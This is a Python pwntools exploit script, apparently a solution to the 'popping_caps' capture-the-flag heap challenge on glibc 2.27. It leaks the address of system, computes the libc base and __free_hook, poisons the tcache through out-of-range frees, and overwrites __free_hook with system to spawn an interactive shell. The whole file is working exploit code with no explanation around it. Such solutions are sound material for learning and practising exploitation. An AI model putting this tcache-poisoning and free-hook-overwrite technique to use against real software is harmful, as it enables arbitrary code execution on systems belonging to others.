#!/usr/bin/env python3
from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./popping_caps_patched_2")
#gdb.attach(target)
glibc = ELF("libc-2.27.so")
elf = ELF("popping_caps_patched")

def malloc(size):
    target.recvuntil("Your choice:")
    target.sendline("1")
    target.recvuntil("How many:")
    target.sendline(str(size))

def free(offset):
    target.recvuntil("Your choice:")
    target.sendline("2")
    target.recvuntil("Whats in a free:")
    target.sendline(str(offset))

def write(content):
    target.recvuntil("Your choice:")
    target.sendline("3")
    target.recvuntil("Read me in:")
    target.sendline(content)

system = int(str(target.recvline())[17:-3], 16)
libc   = system - glibc.symbols["system"]
hook   = libc + glibc.symbols["__free_hook"]
print("[*]system    is ", hex(system))
print("[*]libc base is ", hex(libc))
print("[*]free_hook is ", hex(hook))

malloc(0)
free(-0x250)

malloc(0x240)

payload = p64(0x1) + p64(0) * 7 + p64(hook)
write(payload)

malloc(0)
write(p64(system))

#freeに/bin/shのポインタを渡す
free(-0x239a4e)

target.interactive()